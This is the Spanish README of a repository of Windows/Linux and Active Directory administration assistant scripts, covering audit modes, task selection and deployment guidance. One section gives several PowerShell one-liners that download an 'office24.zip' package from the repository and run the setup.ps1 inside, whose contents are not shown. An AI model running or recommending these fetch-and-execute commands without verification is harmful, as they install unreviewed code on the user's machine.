# sysadmin

Asistentes autónomos de administración Windows/Linux, Active Directory, diagnóstico y recuperación.

[English](README.md) · **Español**

RabbitMole (antes Audit Workbench) tiene [su propio repositorio](https://github.com/sempitern0/RabbitMole). Aquí se mantienen los asistentes de consola, sin dependencias de la PWA.

## Consola general de operaciones

Empieza con `bash sysadmin.sh --lang es`: menú Linux organizado para inventario,
red, almacenamiento, servicios, logs, herramientas y asistentes AD.
Los modos de lectura no necesitan root ni terminal:

```bash
bash sysadmin.sh --preflight --lang es
bash sysadmin.sh --audit --lang es
bash sysadmin.sh --network --lang es
```

Informa de herramientas ausentes y restricciones del entorno. Los diagnósticos tienen
límite de tiempo y los comandos fallidos devuelven un código distinto de cero.
`--tools` ofrece instalación guiada opcional.
[Guía de consola, plataformas y errores](docs/OPERATIONS_CONSOLE.md#español).

## Elige la tarea

| Necesitas… | Empieza por… |
|---|---|
| Inventario, diagnóstico Linux y herramientas guiadas | `bash sysadmin.sh --lang es` |
| Administrar Samba AD en Debian/Ubuntu | `debian-ad-assistant.sh --audit` |
| Administrar Samba AD en Rocky/AlmaLinux | `rhel-ad-assistant.sh --audit` |
| Diagnosticar/administrar AD DS en Windows | `windows-ad-assistant.ps1 -Mode Audit` |
| Unir, diagnosticar o recuperar clientes Linux de AD | `linux-ad-client-assistant.sh --audit` |
| Usar la variante Linux con identidad RHEL | `rhel-ad-client-assistant.sh --audit` |
| Unir, diagnosticar o recuperar clientes Windows de AD | `windows-ad-client-assistant.ps1 -Mode Audit` |
| Planificar actualizaciones o migrar archivos a Ubuntu/Nextcloud | `migration-assistant.ps1 -Mode Interactive` |
| Preparar PCs/portátiles corporativos, aulas o legado Windows | `windows-workstation-assistant.ps1 -Mode Audit` |

Consulta [alcance, procedimientos y recuperación de migraciones](docs/MIGRATIONS_ES.md).

## Primer uso en minutos

```bash
git clone https://github.com/sempitern0/sysadmin.git
cd sysadmin
```

**Asistentes AD:** revisa el script, consulta la ayuda y audita desde una consola elevada.

```bash
bash ./linux-ad-client-assistant.sh --help
bash ./linux-ad-client-assistant.sh --preflight
sudo bash ./linux-ad-client-assistant.sh --audit
# Para un controlador Debian/Ubuntu:
sudo bash ./debian-ad-assistant.sh --audit
```

```powershell
Get-Help .\windows-ad-client-assistant.ps1 -Detailed
# No requiere elevación:
powershell.exe -NoProfile -File .\windows-ad-client-assistant.ps1 -Mode Preflight
# En una consola elevada:
.\windows-ad-client-assistant.ps1 -Mode Audit
# Para un controlador Windows:
.\windows-ad-assistant.ps1 -Mode Audit
```

En Windows utiliza la política de ejecución/firma aprobada por tu organización.
Los scripts de la raíz son descargables y autónomos.


## Descargar y ejecutar el ZIP de Office 2024

El paquete está publicado en [`tools/office24.zip`](https://github.com/sempitern0/sysadmin/blob/main/tools/office24.zip) y contiene `setup.ps1`. Los siguientes ejemplos descargan el ZIP, lo extraen en una carpeta temporal dedicada, localizan `setup.ps1` aunque esté dentro de una subcarpeta y lo ejecutan desde su propia carpeta para respetar las rutas relativas.

**Comando de una línea con PowerShell (`Invoke-WebRequest`):**

```powershell
$ErrorActionPreference='Stop'; $url='https://raw.githubusercontent.com/sempitern0/sysadmin/main/tools/office24.zip'; $zip=Join-Path $env:TEMP 'office24.zip'; $dir=Join-Path $env:TEMP 'office24-setup'; Invoke-WebRequest -Uri $url -OutFile $zip; Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue; Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $setup=Get-ChildItem -LiteralPath $dir -Filter 'setup.ps1' -File -Recurse | Select-Object -First 1; if(-not $setup){throw 'No se encontró setup.ps1 dentro de office24.zip'}; Push-Location $setup.DirectoryName; try { & $setup.FullName } finally { Pop-Location }
```

**Comando de una línea usando `curl.exe`:**

```powershell
$ErrorActionPreference='Stop'; $url='https://raw.githubusercontent.com/sempitern0/sysadmin/main/tools/office24.zip'; $zip=Join-Path $env:TEMP 'office24.zip'; $dir=Join-Path $env:TEMP 'office24-setup'; & curl.exe --fail --location --silent --show-error $url --output $zip; if($LASTEXITCODE -ne 0){throw 'Falló la descarga de office24.zip'}; Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue; Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $setup=Get-ChildItem -LiteralPath $dir -Filter 'setup.ps1' -File -Recurse | Select-Object -First 1; if(-not $setup){throw 'No se encontró setup.ps1 dentro de office24.zip'}; Push-Location $setup.DirectoryName; try { & $setup.FullName } finally { Pop-Location }
```

**Comando de una línea usando `wget.exe` (si está instalado):**

```powershell
$ErrorActionPreference='Stop'; $url='https://raw.githubusercontent.com/sempitern0/sysadmin/main/tools/office24.zip'; $zip=Join-Path $env:TEMP 'office24.zip'; $dir=Join-Path $env:TEMP 'office24-setup'; & wget.exe -O $zip $url; if($LASTEXITCODE -ne 0){throw 'Falló la descarga de office24.zip'}; Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue; Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $setup=Get-ChildItem -LiteralPath $dir -Filter 'setup.ps1' -File -Recurse | Select-Object -First 1; if(-not $setup){throw 'No se encontró setup.ps1 dentro de office24.zip'}; Push-Location $setup.DirectoryName; try { & $setup.FullName } finally { Pop-Location }
```

**Versión paso a paso (más sencilla de revisar y diagnosticar):**

```powershell
$ErrorActionPreference = 'Stop'
$url = 'https://raw.githubusercontent.com/sempitern0/sysadmin/main/tools/office24.zip'
$zip = Join-Path $env:TEMP 'office24.zip'
$dir = Join-Path $env:TEMP 'office24-setup'

Invoke-WebRequest -Uri $url -OutFile $zip
Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force

$setup = Get-ChildItem -LiteralPath $dir -Filter 'setup.ps1' -File -Recurse |
    Select-Object -First 1
if (-not $setup) { throw 'No se encontró setup.ps1 dentro de office24.zip' }

Push-Location $setup.DirectoryName
try {
    # Revisa setup.ps1 antes de ejecutarlo; eleva la consola solo si el script lo requiere.
    & $setup.FullName
} finally {
    Pop-Location
}
```

Estos comandos descargan la versión actual del ZIP en `main`, por lo que su contenido puede cambiar. Para despliegues administrados, fija una release o un commit revisado y comprueba el SHA-256 del ZIP antes de ejecutarlo. Revisa `setup.ps1` y respeta la política de ejecución/firma de PowerShell aprobada para el equipo; estos ejemplos no desactivan esa política ni usan `ExecutionPolicy Bypass`.

## Desplegar una revisión verificada

La [guía de lanzamiento](docs/DEPLOYMENT_ES.md) explica cómo elegir el asistente, descargar por commit, comprobar hashes/sintaxis, copiar por SSH y lanzar en Windows. CI genera un paquete con checksums solo tras superar las comprobaciones Linux y Windows PowerShell 5.1/7.

`--preflight` / `-Mode Preflight` no modifica el sistema. Comprueba requisitos locales; la auditoría posterior sí puede crear logs e informes. Un resultado correcto no sustituye una prueba de cambio y recuperación en laboratorio.

## Criterios de operación

- Empieza por auditoría/diagnóstico y aplica cambios con una vía de recuperación.
- Conserva backups restaurables y acceso por consola antes de cambiar DNS, SSH, firewall o pertenencia al dominio.
- El aprovisionamiento Samba AD DC en RHEL está protegido por ser un rol no soportado; consulta las [notas de plataforma](docs/OPERATIONS_ES.md#control-plane-enterprise-linux).
- Las implementaciones difieren entre plataformas. Una comprobación de sintaxis o un hardening no certifican preparación para producción ni cumplimiento completo.

## Referencia, recuperación y mantenimiento

| Consulta | Guía |
|---|---|
| Comandos AD, DNS, GPO, IDS, backups y recuperación | [Referencia operativa](docs/OPERATIONS_ES.md) |
| Diagnosticar DNS, Kerberos o unión a dominio | [Resolución de problemas](docs/OPERATIONS_ES.md#troubleshooting) |
| Localizar estado, snapshots y logs | [Rutas de estado](docs/OPERATIONS_ES.md#rutas-de-estado-y-logs) |
| Modificar código y ejecutar pruebas offline | [Mantenimiento](docs/MAINTENANCE.md) |

```bash
python3 tools/verify.py              # Sintaxis, paridad y pruebas de regresión
# CI exige también ShellCheck y PowerShell:
python3 tools/verify.py --require-shellcheck --require-powershell
```

[Licencia MIT](LICENSE).

[Guía de preparación Windows](docs/WORKSTATIONS_ES.md).
